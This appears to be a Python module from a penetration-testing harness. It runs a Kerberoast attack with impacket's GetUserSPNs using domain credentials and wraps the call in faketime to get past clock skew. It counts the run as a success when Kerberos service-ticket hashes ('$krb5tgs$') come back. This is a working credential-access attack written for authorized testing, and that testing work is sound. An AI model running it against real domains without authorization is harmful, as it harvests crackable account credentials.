"""Kerberoast via impacket-GetUserSPNs. Fix = AD hardening (NOT SD-WAN)."""
META = {
    "id": "kerberoast",
    "name": "Kerberoast",
    "category": "AD Exploitation",
    "test_type": "pentest",
    "added": True,  # opt-in, not in the original baseline set
    "control": "AD hardening (NOT SD-WAN)",
    "fix": "Server",
    "mitre": ['T1558.003'],
    "cwe": ['CWE-522'],
    "tactic": 'Credential Access',
    "requires": [],                 # resolved at runtime across impacket flavours
    "requires_py": ["impacket"],    # the real dependency (the CLI name varies)
    "ports": [("tcp", 88), ("tcp", 389)],
    # Success = an actual roastable TGS hash was returned. The old regex also
    # matched the "ServicePrincipalName" column HEADER (printed whenever any SPN
    # account exists, even when no ticket was granted) and a loose "MSSQL/",
    # scoring enumeration-only / blocked-roast runs as a false finding.
    "success_regex": r"\$krb5tgs\$",
    "blocked_regex": r"timed out|Connection refused|unreachable|Errno|No entries",
}

def run(target, ctx):
    # Kerberoast (GetUserSPNs -request) needs valid domain creds. With no password
    # GetUserSPNs.py calls getpass() on a closed stdin -> EOFError -> NO-RESULT.
    # Skip cleanly instead (same guard as ssh_brute).
    if not (ctx.creds.get("dc_pass") or "").strip():
        return ("# kerberoast vs {t}\n\n[SKIP] no domain password configured "
                "(set HARNESS_DC_PASS / credentials.env) — Kerberoast needs valid "
                "creds to request TGS tickets.".format(t=target))
    from modules import _impacket
    tool = _impacket.resolve("GetUserSPNs")
    if not tool:
        return ("# kerberoast vs {t}\n\n[SKIP] impacket not installed — GetUserSPNs "
                "unavailable (pip install impacket / apt python3-impacket).".format(t=target))
    # Kerberoast does a full pre-auth AS-REQ (it has creds), which carries a
    # PA-ENC-TIMESTAMP — so a DC clock skew > 5 min fails it with KRB_AP_ERR_SKEW
    # (AS-REP roasting avoids this precisely because pre-auth is disabled there).
    # GetUserSPNs runs as a subprocess, so the in-process _clockskew patch can't
    # reach it; correction_prefix() wraps it in faketime instead when needed.
    from modules import _clockskew
    prefix, note = _clockskew.correction_prefix(target)
    out = ctx.run_cmd(
        prefix + tool + " {domain}/{dc_user}:{dc_pass} -dc-ip {target} -request", target)
    return (note + "\n\n" + out) if note else out
